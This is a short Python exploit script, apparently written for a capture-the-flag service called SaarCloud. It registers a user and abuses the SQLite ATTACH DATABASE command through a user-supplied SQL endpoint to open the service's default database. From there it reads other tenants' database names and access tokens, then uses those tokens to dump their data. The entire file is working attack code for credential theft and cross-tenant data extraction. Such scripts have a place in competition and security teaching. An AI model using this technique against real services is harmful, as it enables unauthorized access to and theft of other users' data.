import random
import socket
import string

import requests
import sys


"""
Sqlite has an ATTACH command, that lets you open additional databases.
We can simply open the default database, and extract all access tokens from there.
"""


def random_string(length=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.base = f'http://{hostname}.{ip}.nip.io:8080'

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


def exploit(target):
    session = SaarCloudSession(target)
    # Register a new user for rds
    username = random_string()
    token = session.post('/api/register/rds', json={'username': username}).json()['token']

    # Attach the default database ...
    sql = '''ATTACH DATABASE "../databases/default.sqlite3" AS my_default_db; '''
    print(sql, '=>', session.post(f'/api/rds/{username}?token={token}', data=sql).text)

    # ... and read interesing dbnames / tokens from it
    sql = '''SELECT * FROM my_default_db.rds_databases ORDER BY id DESC LIMIT 20;'''
    users_with_tokens = session.post(f'/api/rds/{username}?token={token}', data=sql).json()
    print(sql, '=>', users_with_tokens)

    # dump the databases using the valid credentials
    for user in users_with_tokens:
        response = session.get(f'/api/rds/{user["dbname"]}/appendonly_issues/select?token={user["token"]}')
        print('Dumping', user["dbname"], '=>', response.text)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
